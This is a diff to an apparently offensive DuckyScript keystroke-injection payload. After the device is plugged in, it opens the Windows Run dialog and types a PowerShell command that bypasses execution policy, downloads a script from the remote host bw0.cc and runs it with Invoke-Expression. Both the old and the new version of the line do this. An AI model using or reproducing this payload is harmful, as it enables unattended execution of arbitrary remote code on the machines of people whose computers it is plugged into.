@@ -12,5 +12,5 @@ DEFAULT_DELAY 100
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -C $txt = 'https://beigeworm.com'; irm bw0.cc/qrgen | iex
+STRING powershell -Ep Bypass -C $txt = 'beigeworm.com'; iex (irm bw0.cc/qrgen)
 ENTER
